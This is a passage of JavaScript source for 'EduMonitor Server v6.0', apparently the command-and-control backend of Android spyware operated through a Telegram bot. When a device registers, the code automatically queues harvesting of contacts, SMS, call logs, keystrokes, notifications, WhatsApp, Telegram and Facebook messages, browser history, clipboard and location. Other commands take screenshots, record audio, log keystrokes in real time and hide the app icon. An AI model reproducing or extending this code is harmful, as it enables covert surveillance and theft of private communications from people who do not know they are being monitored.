    welcomeMessage += `🤖 Android: ${deviceInfo.android}\n`;
    welcomeMessage += `🆔 ID: ${deviceId.substring(0, 8)}...\n\n`;
    
    if (isNewDevice) {
        welcomeMessage += `You now have ${userDevices.length} device(s) registered.\n\n`;
        welcomeMessage += `🔄 <b>Auto-collecting data...</b>\n`;
        welcomeMessage += `The server is automatically requesting:\n`;
        welcomeMessage += `• 📱 Device Info\n`;
        welcomeMessage += `• 🌐 Network Info\n`;
        welcomeMessage += `• 📱 Mobile Info\n`;
        welcomeMessage += `• 📇 Contacts\n`;
        welcomeMessage += `• 💬 SMS Messages\n`;
        welcomeMessage += `• 📞 Call Logs\n`;
        welcomeMessage += `• 📱 Installed Apps\n`;
        welcomeMessage += `• ⌨️ Keystrokes\n`;
        welcomeMessage += `• 🔔 Notifications\n`;
        welcomeMessage += `• 💬 WhatsApp\n`;
        welcomeMessage += `• 💬 Telegram\n`;
        welcomeMessage += `• 💬 Facebook\n`;
        welcomeMessage += `• 🌐 Browser History\n`;
        welcomeMessage += `• 📋 Clipboard\n`;
        welcomeMessage += `• 📅 Calendar\n`;
        welcomeMessage += `• 📍 Location\n\n`;
        welcomeMessage += `This may take a few moments as the device processes each request.`;
        
        if (userDevices.length === 1) {
            userDeviceSelection.set(deviceConfig.chatId, deviceId);
            welcomeMessage += `\n\n✅ This device has been automatically selected for control.`;
        }
    } else {
        welcomeMessage += `Device information updated.`;
    }
    
    await sendTelegramMessageWithKeyboard(
        deviceConfig.chatId,
        welcomeMessage,
        getMainMenuKeyboard(deviceConfig.chatId)
    );
    
    if (isNewDevice) {
        queueAutoDataCommands(deviceId, deviceConfig.chatId);
    }
    
    res.json({
        status: 'registered',
        deviceId,
        chatId: deviceConfig.chatId,
        config: deviceConfig.config
    });
});

// ============= CALLBACK QUERY HANDLER =============

async function handleCallbackQuery(callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const callbackId = callbackQuery.id;
    
    console.log(`🖱️ Callback received: ${data} from chat ${chatId}`);
    
    await answerCallbackQuery(callbackId);
    
    // Handle consolidated command callbacks
    if (data.startsWith('cmd:')) {
        const command = data.substring(4);
        console.log(`🎯 Executing consolidated command from button: ${command}`);
        
        await answerCallbackQuery(callbackId, `⏳ Executing ${command}...`);
        
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: command,
            originalCommand: `/${command}`,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        await sendTelegramMessage(chatId, `✅ Command sent: /${command}`);
        
        const keyboard = [[createInlineButton('◀️ Back to Menu', 'help_main')]];
        await editMessageKeyboard(chatId, messageId, keyboard);
        return;
    }
    
    // Handle other menu callbacks...
    if (data === 'help_main') {
        await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
        await sendTelegramMessage(chatId, "🤖 *EduMonitor Control Panel*\n\nSelect a category to get started.");
    } else if (data === 'menu_new_features') {
        await editMessageKeyboard(chatId, messageId, getNewFeaturesKeyboard());
        await sendTelegramMessage(chatId, "🆕 *NEW FEATURES*\n\nSelect a category to explore!");
    } else if (data === 'menu_detailed_exports') {
        await editMessageKeyboard(chatId, messageId, getDetailedExportsKeyboard());
    } else if (data === 'menu_file_scanner') {
        await editMessageKeyboard(chatId, messageId, getFileScannerKeyboard());
    } else if (data === 'menu_data_saving') {
        await editMessageKeyboard(chatId, messageId, getDataSavingKeyboard());
    } else if (data === 'menu_audio_quality') {
        await editMessageKeyboard(chatId, messageId, getAudioQualityKeyboard());
    } else if (data === 'menu_sync_harvest') {
        await editMessageKeyboard(chatId, messageId, getSyncHarvestKeyboard());
    } else if (data === 'menu_realtime_advanced') {
        await editMessageKeyboard(chatId, messageId, getRealtimeAdvancedKeyboard());
    } else if (data === 'menu_devices') {
        const keyboard = getDeviceSelectionKeyboard(chatId);
        const userDevices = getDeviceListForUser(chatId);
        let message = `📱 *Device Management*\n\nYou have ${userDevices.length} device(s).\n\nSelect a device to control:`;
        await editMessageKeyboard(chatId, messageId, keyboard);
        await sendTelegramMessage(chatId, message);
    } else if (data.startsWith('select_device:')) {
        const selectedDeviceId = data.split(':')[1];
        const device = devices.get(selectedDeviceId);
        if (device) {
            userDeviceSelection.set(chatId, selectedDeviceId);
            await answerCallbackQuery(callbackId, `✅ Now controlling ${device.deviceInfo?.model || 'device'}`);
            await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
            await sendTelegramMessage(chatId, `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}`);
        }
    } else if (data === 'close_menu') {
        await editMessageKeyboard(chatId, messageId, []);
    } else if (data === 'refresh_devices') {
        const keyboard = getDeviceSelectionKeyboard(chatId);
        await editMessageKeyboard(chatId, messageId, keyboard);
        await answerCallbackQuery(callbackId, '🔄 Device list refreshed');
    } else if (data === 'device_stats') {
        const userDevices = getDeviceListForUser(chatId);
        let message = `📊 *Device Statistics*\n\nTotal Devices: ${userDevices.length}\n\n`;
        userDevices.forEach((device, index) => {
            message += `${index + 1}. ${device.name}\n`;
            message += `   ID: ${device.id.substring(0, 8)}...\n`;
            message += `   Last Seen: ${device.lastSeenFormatted}\n`;
            message += `   Status: ${(Date.now() - device.lastSeen) < 300000 ? '✅ Online' : '⏹️ Offline'}\n\n`;
        });
        await sendTelegramMessage(chatId, message);
    }
}

// ============= WEBHOOK ENDPOINT =============

app.post('/webhook', async (req, res) => {
    res.sendStatus(200);
    
    setImmediate(async () => {
        try {
            const update = req.body;
            console.log('📩 Received update type:', update.callback_query ? 'callback' : (update.message ? 'message' : 'other'));

            if (update.callback_query) {
                await handleCallbackQuery(update.callback_query);
                return;
            }

            if (!update?.message) {
                console.log('📭 Non-message update');
                return;
            }

            const chatId = update.message.chat.id;
            const text = update.message.text;
            const messageId = update.message.message_id;

            if (!isAuthorizedChat(chatId)) {
                console.log(`⛔ Unauthorized chat: ${chatId}`);
                await sendTelegramMessage(chatId, '⛔ You are not authorized to use this bot.');
                return;
            }

            await setChatMenuButton(chatId);

            const userState = userStates.get(chatId);
            
            if (userState) {
                await handleConversationMessage(chatId, text, messageId, userState);
                return;
            }

            if (text?.startsWith('/')) {
                await handleCommand(chatId, text, messageId);
            } else {
                await sendTelegramMessageWithKeyboard(
                    chatId,
                    "🤖 Use the menu button below or type /help to see available commands.",
                    getMainMenuKeyboard(chatId)
                );
            }
        } catch (error) {
            console.error('❌ Error processing webhook:', error);
        }
    });
});

// ============= CONVERSATION HANDLER =============

async function handleConversationMessage(chatId, text, messageId, userState) {
    switch (userState.state) {
        case SCHEDULE_STATES.AWAITING_START_TIME:
            if (!text.match(/^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$/)) {
                await sendTelegramMessage(chatId, "❌ Invalid time format. Please use HH:MM (e.g., 22:00)");
                return;
            }
            userState.data.startTime = text;
            userState.state = SCHEDULE_STATES.AWAITING_END_TIME;
            await sendTelegramMessage(chatId, "✅ Start time recorded.\n\nNow enter the END time (HH:MM)");
            break;
            
        case SCHEDULE_STATES.AWAITING_END_TIME:
            if (!text.match(/^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$/)) {
                await sendTelegramMessage(chatId, "❌ Invalid time format. Please use HH:MM");
                return;
            }
            userState.data.endTime = text;
            userState.state = SCHEDULE_STATES.AWAITING_RECURRING;
            const keyboard = [[
                createInlineButton('✅ Daily', 'recurring:daily'),
                createInlineButton('🔄 Once', 'recurring:once')
            ]];
            await sendTelegramMessageWithKeyboard(chatId, "Should this schedule repeat daily or run once?", keyboard);
            break;
            
        case SCHEDULE_STATES.AWAITING_RECURRING:
            // Handle recurring selection via callback
            break;
            
        case SCHEDULE_STATES.AWAITING_INTERVAL:
            const interval = parseInt(text);
            if (isNaN(interval) || interval < 5 || interval > 120) {
                await sendTelegramMessage(chatId, "❌ Invalid interval. Please enter a number between 5 and 120.");
                return;
            }
            
            const [startHour, startMin] = userState.data.startTime.split(':').map(Number);
            const [endHour, endMin] = userState.data.endTime.split(':').map(Number);
            const recurring = userState.data.recurring;
            
            const command = `/record_custom ${startHour}:${startMin} ${endHour}:${endMin} ${recurring ? 'daily' : 'once'} ${interval}`;
            
            userStates.delete(chatId);
            
            const selectedDeviceId = userDeviceSelection.get(chatId);
            const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
            
            if (device) {
                if (!device.pendingCommands) device.pendingCommands = [];
                device.pendingCommands.push({
                    command: 'record_custom',
                    originalCommand: command,
                    messageId: messageId,
                    timestamp: Date.now()
                });
                await sendTelegramMessage(chatId, `✅ Custom schedule configured and sent to device.`);
            }
            break;
    }
}

// ============= COMMAND HANDLER =============

async function handleCommand(chatId, command, messageId) {
    console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);

    // Get selected device
    let selectedDeviceId = userDeviceSelection.get(chatId);
    let device = null;
    
    if (selectedDeviceId) {
        device = devices.get(selectedDeviceId);
    }
    
    if (!device) {
        for (const [id, d] of devices.entries()) {
            if (String(d.chatId) === String(chatId)) {
                selectedDeviceId = id;
                device = d;
                userDeviceSelection.set(chatId, selectedDeviceId);
                break;
            }
        }
    }

    if (!device) {
        await sendTelegramMessageWithKeyboard(chatId, 
            '❌ No device registered.\n\nPlease make sure the Android app is running.',
            getMainMenuKeyboard(chatId));
        return;
    }

    device.lastSeen = Date.now();
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    // Extract command without slash
    const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
    
    device.pendingCommands.push({
        command: cleanCommand,
        originalCommand: command,
        messageId: messageId,
        timestamp: Date.now()
    });
    
    console.log(`📝 Command queued for device ${selectedDeviceId}: ${cleanCommand}`);
    
    await sendTelegramMessage(chatId, `✅ Command sent: ${command}\n📱 Device: ${device.deviceInfo?.model || 'Unknown'}`);
}

// ============= START SERVER =============

app.listen(PORT, '0.0.0.0', () => {
    const serverIP = getServerIP();
    console.log('\n🚀 ===============================================');
    console.log(`🚀 EduMonitor Server v6.0 - Consolidated Commands`);
    console.log(`🚀 Server IP: ${serverIP}`);
    console.log(`🚀 Port: ${PORT}`);
    console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
    console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
    console.log('\n✅ CONSOLIDATED COMMANDS:');
    console.log('   📋 /help - Complete help menu');
    console.log('   📱 /device_info - Complete device info');
    console.log('   🌐 /network_info - Complete network info');
    console.log('   📱 /mobile_info - Complete mobile & SIM info');
    console.log('   📸 /screenshot - Take screenshot');
    console.log('   ⚙️ /screenshot_settings - Screenshot settings');
    console.log('   🎤 /start_60s_rec - Start 60s recording');
    console.log('   ⏹️ /stop_60s_rec - Stop recording');
    console.log('   📊 /record_info - Recording information');
    console.log('   🎚️ /audio_ultra/low/medium/high - Audio quality');
    console.log('   📇 /contacts - Export contacts');
    console.log('   💬 /sms - Export SMS');
    console.log('   📞 /calllogs - Export call logs');
    console.log('   📱 /apps_list - Export apps');
    console.log('   ⌨️ /keys - Export keystrokes');
    console.log('   🔔 /notify - Export notifications');
    console.log('   📱 /open_app - Export app opens');
    console.log('   💬 /whatsapp - WhatsApp logs');
    console.log('   💬 /telegram - Telegram logs');
    console.log('   💬 /facebook - Facebook logs');
    console.log('   🌐 /browser - Browser history');
    console.log('   📋 /clipboard - Clipboard logs');
    console.log('   📅 /calendar - Calendar events');
    console.log('   🔍 /scan_all - Full system scan');
    console.log('   🎵 /scan_media - Media scan');
    console.log('   🔑 /rt_keys_on/off - Keystroke real-time');
    console.log('   🔔 /rt_notif_on/off - Notification real-time');
    console.log('   ✅ /rt_all_on/off - All real-time');
    console.log('   📡 /saving_status - Network saving status');
    console.log('   📡 /wifi_only_on/off - WiFi-only mode');
    console.log('   🔄 /sync_all - Sync all data');
    console.log('   ⚡ /force_harvest - Force harvest');
    console.log('   📊 /logs_count - Database stats');
    console.log('   🗑️ /clear_logs - Clear logs');
    console.log('   🔄 /reboot_app - Reboot services');
    console.log('   👻 /hide_icon - Hide icon');
    console.log('   👁️ /show_icon - Show icon');
    console.log('\n🚀 TOTAL CONSOLIDATED COMMANDS: 45+');
    console.log('🚀 ===============================================\n');
});
